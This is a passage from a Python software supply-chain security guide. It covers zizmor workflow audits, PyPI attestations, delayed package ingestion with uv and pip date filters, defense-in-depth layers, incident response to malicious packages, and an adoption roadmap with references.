  zizmor:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
      contents: read
      actions: read
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
        with:
          persist-credentials: false
      - uses: zizmorcore/zizmor-action@71321a20a9ded102f6e9ce5718a2fcec2c4f70d8 # v0.5.2
```

Key audits relevant to supply chain security:

- **template-injection** — `${{ }}` expansion with attacker-controlled input enables shell injection,
- **unpinned-uses** — actions referenced by tag instead of SHA can be hijacked,
- **excessive-permissions** — over-scoped `GITHUB_TOKEN` increases blast radius,
- **use-trusted-publishing** — flags workflows still using long-lived PyPI tokens instead of OIDC,
- **impostor-commit** — detects fork commits masquerading as main repo commits (requires `--gh-token`),
- **known-vulnerable-actions** — flags actions with publicly disclosed CVEs.

zizmor also has [VS Code integration](https://marketplace.visualstudio.com/items?itemName=zizmor.zizmor-vscode) and can
run as an LSP server (`zizmor --lsp`) for real-time feedback in any editor.

### Package Attestations

PyPI attestations provide cryptographic proof of package provenance using [Sigstore](https://www.sigstore.dev/),
following [PEP 740](https://peps.python.org/pep-0740/) (Index support for digital attestations). Since PyPA publish
action v1.11.0, attestations are generated automatically:

```yaml
  - uses: pypa/gh-action-pypi-publish@7f25271a4aa483500f742f9492b2ab5648d61011 # v1.12.4
  # Attestations generated automatically since v1.11.0
```

Abridged attestation metadata links packages to source repositories:

```json
{
  "predicateType": "https://docs.pypi.org/attestations/publish/v1",
  "subject": [
    {
      "name": "package-1.0.0.tar.gz",
      "digest": {
        "sha256": "d667207822..."
      }
    }
  ],
  "predicate": {
    "repository": "https://github.com/user/package",
    "workflow": ".github/workflows/publish.yml",
    "commit": "a1b2c3d4e5f6..."
  }
}
```

Adoption is growing rapidly. By end of 2025,
[50,000+ projects used Trusted Publishing and 17% of uploads included attestations](https://blog.pypi.org/posts/2025-12-31-pypi-2025-in-review/).
Trusted Publishing also
[expanded to organizations and GitLab Self-Managed instances (beta)](https://blog.pypi.org/posts/2025-11-10-trusted-publishers-coming-to-orgs/).
As of March 2026, 132,360+ packages have attestations (see
[Are we PEP 740 yet?](https://trailofbits.github.io/are-we-pep740-yet/)).

The attestation shown above is a PyPI "publish" attestation — it proves the publishing identity and links back to the
source repository. Under the hood, PyPI attestations use the
[in-toto attestation framework](https://github.com/in-toto/attestation), which defines the attestation format that both
Sigstore and [SLSA](https://slsa.dev/) (Supply-chain Levels for Software Artifacts) build on. SLSA standardizes what
attestations *contain* (provenance metadata), while in-toto defines the attestation *format* itself.
[PEP 740](https://peps.python.org/pep-0740/) also defines a slot for SLSA provenance attestations alongside publish
attestations, though tooling for generating and uploading both to PyPI is still maturing. For non-PyPI use cases,
GitHub's [actions/attest](https://github.com/actions/attest) can generate SLSA provenance and SBOM attestations for any
artifact. The [OpenSSF](https://openssf.org/) (Open Source Security Foundation) maintains SLSA as part of a broader
effort to improve open source software security.

### Attestations in Practice

During the Ultralytics compromise, attestations would have let investigators quickly identify which versions came from a
compromised workflow versus legitimate ones — no manual forensic analysis needed. The Sigstore transparency logs provide
an independent audit trail with exact timestamps and workflow provenance for each published artifact.

## Add Time-Based Defenses

When an attacker publishes a malicious package to PyPI, it becomes instantly available worldwide. Detection times vary
widely - some attacks are caught within days, while others go unnoticed for weeks or months. However, targeted,
high-profile packages or obvious malware often get reported relatively quickly as the community tests and analyzes new
releases. PyPI has also introduced a [quarantine system](https://blog.pypi.org/posts/2024-12-30-quarantine/) that can
freeze suspected malware while preserving it for investigation, rather than immediately deleting it - in 2025,
[over 2,000 malware reports were processed with 66% handled within 4 hours](https://blog.pypi.org/posts/2025-12-31-pypi-2025-in-review/).

This is where delayed ingestion comes in - intentionally waiting before using newly published packages. It's not a
guarantee (some attacks evade detection for months), but it's a risk-reduction tactic that gives the community time to
discover obvious threats:

```mermaid
timeline
    title Package Publication to Discovery Timeline
    Day 0 : Malicious package published to PyPI
          : Instantly available worldwide
    Day 1-3 : Community testing and usage
            : Security researchers analyze
    Day 3-5 : Suspicious behavior reported
            : Analysis confirms malicious code
    Day 5-7 : PyPI removes package
            : Security advisories published
```

### For Individual Developers

Modern tools support time-based filtering. uv has `--exclude-newer`, and pip v26 introduced `--uploaded-prior-to` with
the same purpose (both rely on upload-time metadata from [PEP 700](https://peps.python.org/pep-0700/)):

```bash
# uv: only use packages published before a specific date
uv pip compile --exclude-newer 2026-03-02 requirements.in -o requirements.txt

# pip v26+: equivalent functionality
pip install --uploaded-prior-to 2026-03-02T00:00:00Z -r requirements.txt
```

This provides a buffer period that can help catch obvious malicious packages before they reach your systems. Think of it
as letting others be the "canaries in the coal mine." Note that both flags rely on the package index reporting accurate
upload timestamps — they're one layer, not a guarantee.

**Limitations**: Delayed ingestion won't catch sophisticated attacks that evade detection, doesn't protect against
vulnerabilities in packages you're already using, and delays access to security patches (you might need to expedite
critical fixes). It's one layer of defense, not a complete solution.

### For Organizations

Organizations running internal package repositories have two main approaches:

**Simple Mirror (Read-Through Cache):**

```mermaid
graph LR
    A1[PyPI] -->|Instant sync| B1[Internal Mirror]
    B1 -->|Immediate access| C1[Developers]
    style B1 fill:#f59e0b,stroke:#d97706,color:#fff
```

**Ingestion Control (Delayed):**

```mermaid
graph LR
    A2[PyPI] -->|New package| B2[Ingestion Queue]
    B2 -->|Wait 7 days| C2[Security Scan]
    C2 -->|Approved| D2[Internal Mirror]
    D2 -->|Controlled access| E2[Developers]
    style C2 fill:#50b432,stroke:#3d8a26,color:#fff
    style D2 fill:#50b432,stroke:#3d8a26,color:#fff
```

A simple mirror acts as a proxy to PyPI, making packages available immediately after publication. While this provides
faster downloads, offline availability, and enables centralized logging, it offers limited protection against
supply-chain attacks - malicious packages get through instantly unless you layer on additional controls like scanning or
allowlists. Examples include devpi in simple mode and basic Artifactory setups.

Ingestion control actively controls what packages enter the organization by enforcing a mandatory delay window
(typically 6-7 days) and scanning packages before making them available. This provides security benefit by giving the
community time to discover threats, but requires dedicated infrastructure and policy management.

#### How Ingestion Control Works

For organizations with the resources to run ingestion control, the system works like this:

```mermaid
sequenceDiagram
    participant PyPI as Public PyPI
    participant Queue as Ingestion Queue
    participant Scan as Security Scanner
    participant Mirror as Internal Mirror
    participant Dev as Your Developers

    PyPI->>Queue: New package published
    Note over Queue: Hold for 7 days
    Queue->>Scan: Check threat intelligence
    Scan->>Scan: Verify checksums or attestations
    alt Package is safe after delay
        Scan->>Mirror: Approve for release
        Mirror->>Dev: Package available
    else Malicious package discovered
        Scan->>Queue: Block package
        Note over Dev: Package never available
    end
```

Key components:

- **Delay window**: Typically 6-7 days before new packages become available,
- **Threat monitoring**: Continuous monitoring of security advisories and threat feeds,
- **Allow/block lists**: Manual control for known-good and known-bad packages,
- **Automatic blocking**: Integration with vulnerability databases and threat intelligence,
- **Expedited ingestion**: Fast-track process for critical security patches (with approval),
- **Internal package bypass**: Company-developed packages skip the delay entirely.

Who should use ingestion control? Large enterprises with dedicated security teams, organizations in regulated industries
(finance, healthcare, government), companies with resources to maintain additional infrastructure, and environments
where security outweighs developer convenience.

Who should stick with simple mirrors? Small to medium companies without dedicated security infrastructure, organizations
where `uv lock --exclude-newer` on individual projects is sufficient, and teams that rely primarily on vulnerability
scanning and pinning for security.

**For small teams (under 50 developers):** Delayed ingestion requires dedicated infrastructure, security expertise, and
ongoing maintenance. The ROI calculation often favors simpler approaches: use `uv pip compile --exclude-newer` with a
date a week in the past on individual projects, enable Dependabot for automated security updates, run `pip-audit` in CI,
and monitor security advisories manually. These provide 80% of the protection with 20% of the complexity. Scale up to
ingestion control only when you have dedicated security infrastructure.

## Putting It All Together

Each security practice we've discussed provides a layer of defense. Together, they create a comprehensive security
posture where if one layer fails, others still protect you. This is called "defense in depth." Here's how these layers
work together in your development pipeline:

Most Python developers consume packages rather than publish them. The two paths share early stages but diverge at build
time:

```mermaid
flowchart TB
    subgraph Development
        Code[Write Code] --> Lint[Ruff Security Linting]
        Lint -->|Pass| Commit[Commit Code]
    end

    subgraph "Dependency Management"
        Commit --> Lock[uv lock with hashes]
        Lock --> Audit[pip-audit scan]
    end

    Audit -->|Pass| Consumer
    Audit -->|Pass| Publisher

    subgraph Consumer["Application Deployment"]
        CDeploy[Deploy to Production] --> CMonitor[Monitor Runtime]
    end

    subgraph Publisher["Package Publishing"]
        Build[Build Package] --> SBOM[Generate SBOM]
        SBOM --> Attest[Create Attestation<br/>via Trusted Publishing]
        Attest --> PyPI[Upload to PyPI]
    end

    subgraph "Ingestion (consumers of published packages)"
        PyPI --> Wait[Delayed Ingestion<br/>7 day wait]
        Wait --> Mirror[Internal Mirror]
    end

    style Lint fill:#50b432,stroke:#3d8a26,color:#fff
    style Audit fill:#50b432,stroke:#3d8a26,color:#fff
    style SBOM fill:#50b432,stroke:#3d8a26,color:#fff
    style Attest fill:#50b432,stroke:#3d8a26,color:#fff
    style Wait fill:#50b432,stroke:#3d8a26,color:#fff
```

The security layers for **application developers** (most readers):

1. **Development Time**: Ruff catches security bugs in your code before commit.
2. **Pre-Commit**: Dependency pinning with uv ensures reproducible builds.
3. **CI Pipeline**: pip-audit checks for known CVEs before merging.
4. **Deployment**: Deploy with locked, audited dependencies.
5. **Runtime**: Monitor for unexpected outbound connections, anomalous process behavior, or unauthorized file access
   from your dependencies.

Additional layers for **package publishers**:

1. **Build Time**: CycloneDX generates SBOM inventory.
2. **Release Time**: Trusted Publishing creates cryptographic attestations.
3. **Distribution**: Delayed ingestion provides buffer against zero-day compromises for downstream consumers.

### When a CVE is Announced

With this infrastructure in place, responding to a new vulnerability becomes systematic:

```mermaid
flowchart LR
    A[CVE Announced] --> B[Vulnerability Scanner<br/>Flags Package]
    B --> C[SBOM Search<br/>Shows Impact]
    C --> D[Automated PR<br/>with Fix]
    D --> E[CI Validates]
    E --> F[Deploy Fixed<br/>Version]
    style A fill:#dc2626,stroke:#b91c1c,color:#fff
    style F fill:#50b432,stroke:#3d8a26,color:#fff
```

The remediation workflow:

1. **Detection**: Vulnerability scanner flags affected packages automatically.
2. **Impact Analysis**: SBOM search shows every deployment using the affected version.
3. **Remediation**: Automated dependency update tools (like Dependabot) file a PR with the fix.
4. **Validation**: CI runs tests to ensure the upgrade doesn't break functionality.
5. **Deployment**: Once tests pass, the fixed version is deployed.

Most of this is automated. You just review and merge the update.

### When You Discover a Malicious Package

If you've installed a compromised package, time is critical - malicious packages often exfiltrate credentials within
seconds of installation.

1. **Isolate immediately.** Stop all deployments using the affected dependency and block the package version in your
   internal mirror if you have one. The goal is to prevent further installations while you investigate.

2. **Assess the damage.** Check if the malicious code actually executed by reviewing logs and process lists. Identify
   what secrets the package could have accessed - environment variables, filesystem credentials, cloud tokens. Use your
   SBOM to find all affected projects across your organization.

3. **Contain the breach.** Rotate all credentials the package could have accessed: API keys, database passwords, cloud
   credentials. Scan systems for indicators of compromise and check outbound network connections for signs of data
   exfiltration.

4. **Remove and remediate.** Pin to a known-good version or remove the dependency entirely. Run `pip-audit` to verify no
   other vulnerabilities were introduced, then update your lockfiles with the fixed version.

5. **Report.** Report the malicious package via [PyPI's security reporting system](https://pypi.org/security/). Notify
   your security team and potentially affected customers. Document the incident for future reference - what happened,
   how it was detected, and what you changed to prevent recurrence.

## Your Roadmap

Supply chain security can seem overwhelming, but you don't need to implement everything at once. A practical roadmap
prioritized by impact and ease of implementation:

```mermaid
graph TD
    Start[Starting Point] --> Phase1[Phase 1: Quick Wins<br/>1-2 days]
    Phase1 --> Phase2[Phase 2: Foundations<br/>1 week]
    Phase2 --> Phase3[Phase 3: Advanced<br/>Ongoing]

    Phase1 --> Q1[Add Ruff linting]
    Phase1 --> Q2[Pin dependencies with uv]

    Phase2 --> F1[Set up pip-audit in CI]
    Phase2 --> F2[Generate SBOMs]
    Phase2 --> F3[Enable Dependabot]
    Phase2 --> F4[Trusted Publishing]

    Phase3 --> A1[Delayed Ingestion]
    Phase3 --> A2[SBOM tracking system]

    style Phase1 fill:#50b432,stroke:#3d8a26,color:#fff
    style Phase2 fill:#f59e0b,stroke:#d97706,color:#fff
    style Phase3 fill:#058dc7,stroke:#046a9c,color:#fff
```

### Phase 1: Quick Wins

Start here for immediate security improvements with minimal effort:

1. **Add Ruff security linting** to catch common vulnerabilities in your code:

   ```bash
   uvx ruff check --select S .  # Just security rules to start
   ```

   Once you're comfortable, expand to `lint.select = ["ALL"]` for broader coverage.

2. **Pin your dependencies** with hash verification:

   ```bash
   uv pip compile --generate-hashes pyproject.toml -o requirements.txt
   ```

### Phase 2: Foundations

Build the foundation for ongoing security:

1. **Add pip-audit to CI** to catch vulnerabilities before they reach production.
2. **Generate SBOMs** at build time to know what's deployed.
3. **Enable Dependabot** or similar tools for automated dependency updates.
4. **Switch to Trusted Publishing** to eliminate credential theft risk.

### Phase 3: Advanced

Implement advanced protections as your security maturity grows:

1. **Set up delayed ingestion** if you manage an internal package mirror.
2. **Build an SBOM tracking system** to quickly respond to vulnerabilities.

### Key Takeaways

Supply chain security isn't a single solution but a layered approach:

- **Prevention**: Linting catches bugs before they're committed.
- **Control**: Pinning and hashing prevent unauthorized package changes.
- **Detection**: Scanning identifies known vulnerabilities.
- **Response**: SBOMs enable rapid incident response.
- **Defense**: Attestations and delayed ingestion add additional protection layers.

Each layer provides defense against different attack vectors. Together, they create a robust security posture that
protects your applications from the evolving threat landscape. The tooling is mature and available today. Start small,
get the basics right, then expand. Even implementing just Phase 1 will significantly improve your security posture. The
only question is: when will you start?

## References

### Security Incidents & Analysis

- [PyPI Blog - Ultralytics Attack Analysis](https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/)
- [PyPI Blog - GitHub Actions Token Exfiltration (GhostAction)](https://blog.pypi.org/posts/2025-09-16-github-actions-token-exfiltration/)
- [PyPI Blog - Shai-Hulud Worm Campaign](https://blog.pypi.org/posts/2025-11-26-pypi-and-shai-hulud/)
- [PyPI Blog - Phishing Attack](https://blog.pypi.org/posts/2025-07-28-pypi-phishing-attack/)
- [PyPI Blog - Preventing Domain Resurrections](https://blog.pypi.org/posts/2025-08-18-preventing-domain-resurrections/)
- [PyPI Blog - Wheel Archive Confusion Attacks](https://blog.pypi.org/posts/2025-08-07-wheel-archive-confusion-attacks/)
- [PyPI Blog - Project Quarantine](https://blog.pypi.org/posts/2024-12-30-quarantine/)
- [PyPI Blog - Securing Accounts via 2FA](https://blog.pypi.org/posts/2023-05-25-securing-pypi-with-2fa/)
- [PyPI Blog - Login Verification](https://blog.pypi.org/posts/2025-11-14-login-verification/)
- [PyPI Blog - 2025 Year in Review](https://blog.pypi.org/posts/2025-12-31-pypi-2025-in-review/)
- [PyPI Security Reporting](https://pypi.org/security/)

### Tools & Documentation

- [Ruff Documentation](https://docs.astral.sh/ruff/) - Fast Python linter with
  [security rules](https://docs.astral.sh/ruff/rules/#flake8-bandit-s)
- [uv Documentation](https://docs.astral.sh/uv/) - Modern Python package installer with
  [lockfile support](https://docs.astral.sh/uv/concepts/projects/#lockfile)
- [pip-tools](https://github.com/jazzband/pip-tools) - Alternative tool for generating pinned requirements with hashes
- [pip Secure Installation Guide](https://pip.pypa.io/en/stable/topics/secure-installs/) - Official pip hash-checking
  documentation
- [pip-audit](https://pypi.org/project/pip-audit/) - PyPA's vulnerability scanner
- [Safety](https://github.com/pyupio/safety) - Alternative vulnerability scanner with malware detection
- [OSV.dev](https://osv.dev/) - Distributed vulnerability database for open source
- [PyPA Advisory Database](https://github.com/pypa/advisory-database) - Python package security advisories
- [CycloneDX Python](https://cyclonedx-bom-tool.readthedocs.io/en/latest/) - SBOM generator documentation
- [Dependabot](https://docs.github.com/en/code-security/how-tos/secure-your-supply-chain) - Automated dependency updates
- [CalmOps - Dependency Security Guide](https://calmops.com/programming/python/dependency-security-vulnerability-scanning/)
- [zizmor](https://docs.zizmor.sh/) - Static analysis for GitHub Actions security
- [zizmor Action](https://github.com/zizmorcore/zizmor-action) - Official GitHub Actions integration

### Standards & Specifications

- [PEP 700](https://peps.python.org/pep-0700/) - Index API upload-time metadata (enables `--exclude-newer` /
  `--uploaded-prior-to`)
- [PEP 740](https://peps.python.org/pep-0740/) - Index support for digital attestations
- [PEP 751](https://peps.python.org/pep-0751/) - Standardized lock file format (`pylock.toml`) with attestation support
- [PyPI Trusted Publishers](https://docs.pypi.org/trusted-publishers/)
- [PyPI Blog - Trusted Publishers for Organizations](https://blog.pypi.org/posts/2025-11-10-trusted-publishers-coming-to-orgs/)
- [Python Packaging Guide - Publishing with GitHub Actions](https://packaging.python.org/en/latest/guides/publishing-package-distribution-releases-using-github-actions-ci-cd-workflows/)
- [Sigstore](https://www.sigstore.dev/) - Cryptographic signing for software artifacts
- [SLSA Framework](https://slsa.dev/) - Supply-chain security levels
- [OpenSSF](https://openssf.org/) - Open Source Security Foundation
- [in-toto Attestation Framework](https://github.com/in-toto/attestation) - Attestation format underpinning Sigstore and
  SLSA
- [SPDX](https://spdx.dev/) - Alternative SBOM standard (Linux Foundation)
- [CNCF Software Supply Chain Security Whitepaper](https://tag-security.cncf.io/community/working-groups/supply-chain-security/supply-chain-security-paper-v2/Software_Supply_Chain_Practices_whitepaper_v2.pdf)
  -- Comprehensive supply chain threat model primer
- [OpenSSF Scorecard](https://securityscorecards.dev/) - Automated security health assessment for open source projects
- [S2C2F](https://github.com/ossf/s2c2f) - Secure Supply Chain Consumption Framework
- [VEX](https://www.cisa.gov/resources-tools/resources/minimum-requirements-vulnerability-exploitability-exchange-vex) -
  CISA minimum requirements for Vulnerability Exploitability eXchange
- [Are we PEP 740 yet?](https://trailofbits.github.io/are-we-pep740-yet/) - Attestation adoption tracking
- [sbomify Python Guide](https://sbomify.com/guides/python/)
